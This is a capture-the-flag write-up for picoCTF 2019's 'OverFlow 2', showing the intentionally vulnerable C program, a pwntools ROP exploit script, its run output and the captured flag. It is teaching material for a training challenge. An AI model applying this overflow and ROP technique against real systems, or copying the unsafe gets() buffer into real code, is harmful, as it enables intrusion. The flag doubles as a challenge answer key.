# OverFlow 2
Binary Exploitation, 250 points

## Description:
> Now try overwriting arguments. Can you get the flag from this program?

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 176
#define FLAGSIZE 64

void flag(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xC0DED00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```


## Solution:

This challenge is similar to last year's [buffer overflow 2](/2018_picoCTF/buffer%20overflow%202.md). We just create a ROP chain using `pwntools` and feed it the appropriate parameters.

```python
# First, generate a pwntools template using:
# pwn template --host 2019shell1.picoctf.com --user dvdalt --path /problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446/vuln

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

import os
if shell is not None:
    shell.set_working_directory(os.path.dirname(remote_path))

def send_payload(proc, payload):
    proc.sendlineafter("Please enter your string: ", payload)

def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm core.* > /dev/null")
    proc = process(exe.path)
    payload = cyclic(200, n = exe.bytes)
    send_payload(proc, payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n = exe.bytes )
    log.info("Overflow offset: {}".format(offset))
    return offset

overflow_offset = get_overflow_offset()

rop = ROP(context.binary)
rop.flag(0xDEADBEEF, 0xC0DED00D)

log.info("ROP: \n{}".format(rop.dump()))

io = start()
payload = fit({overflow_offset: str(rop)}, filler = 'A')
log.info("Sending payload: \n{}".format(hexdump(payload)))

send_payload(io, payload)
print io.recvall()
```

Output:
```console
root@kali:/media/sf_CTFs/pico/OverFlow_2# python exploit.py
[*] '/media/sf_CTFs/pico/OverFlow_2/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[*] dvdalt@2019shell1.picoctf.com:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Opening new channel: 'pwd': Done
[+] Receiving all data: Done (13B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/tmp/tmp.f8okibBswc'
[+] Opening new channel: 'ln -s /home/dvdalt/* .': Done
[+] Receiving all data: Done (0B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446'
[+] Starting local process '/media/sf_CTFs/pico/OverFlow_2/vuln': pid 1058
[*] Process '/media/sf_CTFs/pico/OverFlow_2/vuln' stopped with exit code -11 (SIGSEGV) (pid 1058)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/pico/OverFlow_2/core.1058'
    Arch:      i386-32-little
    EIP:       0x62616177
    ESP:       0xffe432e0
    Exe:       '/media/sf_CTFs/pico/OverFlow_2/vuln' (0x8048000)
    Fault:     0x62616177
[*] Overflow offset: 188
[*] Loaded cached gadgets for 'vuln'
[*] ROP:
    0x0000:        0x80485e6 flag(0xdeadbeef, 0xc0ded00d)
    0x0004:           'baaa' <return address>
    0x0008:       0xdeadbeef arg0
    0x000c:       0xc0ded00d arg1
[+] Starting remote process '/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446/vuln' on 2019shell1.picoctf.com: pi
d 4011235
[*] Sending payload:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    000000b0  41 41 41 41  41 41 41 41  41 41 41 41  e6 85 04 08  │AAAA│AAAA│AAAA│····│
    000000c0  62 61 61 61  ef be ad de  0d d0 de c0               │baaa│····│····││
    000000cc
[+] Receiving all data: Done (239B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 4011235)

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbaaaﾭ
picoCTF{arg5_and_r3turn51b106031}
```